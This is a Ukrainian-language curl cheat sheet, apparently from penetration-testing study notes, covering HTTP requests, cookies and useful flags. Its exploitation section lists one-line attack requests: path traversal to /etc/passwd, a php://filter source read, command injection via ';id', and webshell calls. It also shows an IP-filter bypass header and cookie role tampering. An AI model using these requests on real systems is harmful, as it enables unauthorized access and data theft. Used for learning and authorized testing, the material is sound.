# Cheatsheet: curl

Ручні HTTP-запити: заголовки, POST, куки, API, експлуатація параметрів. ← [web-enum](../02-workflows/web-enum.md)

## Базове
```bash
curl -s http://$TARGET/            # тихо (без прогрес-бару)
curl -sI http://$TARGET/           # лише заголовки (HEAD)
curl -sL http://$TARGET/           # слідувати редіректам
curl -s http://$TARGET/ -o page.html
curl -sv http://$TARGET/ 2>&1      # verbose (бачити запит+відповідь)
```

## Методи, дані, заголовки
```bash
curl -X POST http://$TARGET/login -d 'user=admin&pass=admin'
curl -X POST http://$TARGET/api -H 'Content-Type: application/json' -d '{"id":1}'
curl -H 'Authorization: Bearer <token>' http://$TARGET/api
curl -H 'X-Forwarded-For: 127.0.0.1' http://$TARGET/admin    # обхід IP-фільтра
curl -X PUT  http://$TARGET/api/x -d '...'                   # IDOR/інші методи
curl -X OPTIONS -i http://$TARGET/                           # дозволені методи
```

## Куки / сесії
```bash
curl -c cookies.txt -d 'user=admin&pass=x' http://$TARGET/login   # зберегти куки
curl -b cookies.txt http://$TARGET/dashboard                      # використати
curl -b 'PHPSESSID=abc; role=admin' http://$TARGET/               # підмінити
```

## Експлуатація через параметри
```bash
# LFI / traversal
curl -s "http://$TARGET/?file=../../../../etc/passwd"
curl -s "http://$TARGET/?file=php://filter/convert.base64-encode/resource=index.php"
# command injection
curl -s "http://$TARGET/ping?ip=127.0.0.1;id"
curl -G --data-urlencode 'cmd=;id' http://$TARGET/x    # коректне кодування
# webshell
curl "http://$TARGET/shell.php?cmd=id"
```

## Корисне
| Прапор | Значення |
|---|---|
| `-s` | тихо · `-S` показати помилки |
| `-I` | лише заголовки · `-i` тіло+заголовки |
| `-L` | слідувати редіректам |
| `-k` | ігнорувати SSL-помилки |
| `-G --data-urlencode` | GET з кодуванням параметрів |
| `-x http://127.0.0.1:8080` | через проксі (Burp) |
| `--path-as-is` | не нормалізувати `../` |

## Читання
Увага на `Server`, `Set-Cookie`, редіректи, тіло помилок (SQL/шляхи/версії = витік інформації).
